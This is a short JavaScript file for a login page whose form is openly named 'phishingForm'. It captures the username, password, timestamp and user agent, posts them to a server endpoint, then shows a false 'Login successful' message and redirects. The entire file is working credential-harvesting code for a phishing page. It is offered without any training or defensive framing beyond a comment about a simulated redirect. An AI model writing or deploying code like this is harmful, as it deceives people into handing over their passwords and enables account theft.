// script.js
document.addEventListener('DOMContentLoaded', () => {
 const form = document.getElementById('phishingForm');
 const feedback = document.getElementById('formFeedback');

 form.addEventListener('submit', async (e) => {
 e.preventDefault();
 
 const formData = new FormData(form);
 const data = {
 username: formData.get('username'),
 password: formData.get('password'),
 timestamp: new Date().toISOString(),
 userAgent: navigator.userAgent
 };

 try {
 const response = await fetch('/api/submit', {
 method: 'POST',
 headers: { 'Content-Type': 'application/json' },
 body: JSON.stringify(data)
 });

 if (response.ok) {
 feedback.textContent = 'Login successful! Redirecting...';
 feedback.style.color = 'var(--success)';
 form.reset();
 // Simulate redirect
 setTimeout(() => { window.location.href = '/admin'; }, 1000);
 } else {
 feedback.textContent = 'Error submitting data.';
 feedback.style.color = 'var(--error)';
 }
 } catch (error) {
 console.error('Error:', error);
 feedback.textContent = 'Network error. Please try again.';
 feedback.style.color = 'var(--error)';
 }
 });
});